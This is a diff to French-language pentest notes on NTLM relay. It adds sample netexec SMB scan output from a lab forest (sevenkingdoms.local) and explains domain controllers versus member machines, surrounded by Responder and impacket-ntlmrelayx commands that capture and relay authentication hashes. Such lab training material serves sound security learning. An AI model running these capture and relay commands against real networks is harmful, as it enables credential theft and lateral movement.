@@ -32,6 +32,34 @@ sudo responder -I eth0            # capter des authentifications (hashes NTLMv2)
 Si la **signature SMB** n'est pas exigée, on **relaie** au lieu de casser :
 ```bash
 nxc smb 10.0.0.0/24 --gen-relay-list targets.txt
+# exemple: 
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 192.168.56.0/24
+SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:None)
+SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+# lecture
+Forêt sevenkingdoms.local
+│
+├── Domaine parent : sevenkingdoms.local
+│     └── DC : KINGSLANDING (192.168.56.10)
+│
+└── Domaine enfant : north.sevenkingdoms.local
+      ├── DC : WINTERFELL   (192.168.56.11)
+      └── Membre : CASTELBLACK (192.168.56.22)
+
+sevenkingdoms est le domaine, KINGSLANDING est son contrôleur de domaine (la machine). Un domaine et son DC sont deux choses distinctes.
+
+north n'est pas « dans » kingslanding, il est l'enfant du domaine sevenkingdoms. On parle d'un domaine parent et d'un sous-domaine, réunis dans une même forêt.
+
+Dans north, WINTERFELL est le contrôleur de domaine (c'est lui qui porte l'annuaire north). CASTELBLACK n'est pas un DC : c'est une simple machine membre du domaine north.
+
+Une bonne habitude pour la suite : distingue toujours « nom de domaine » (finit en .local, .lan…) et « nom de machine » (un hostname court, en majuscules ici). Dès que tu verras un hostname, demande-toi : DC ou simple membre ?
+```
+
+
+```bash
 sudo responder -I eth0            # (désactiver SMB/HTTP dans Responder.conf)
 impacket-ntlmrelayx -tf targets.txt -smb2support
 ```
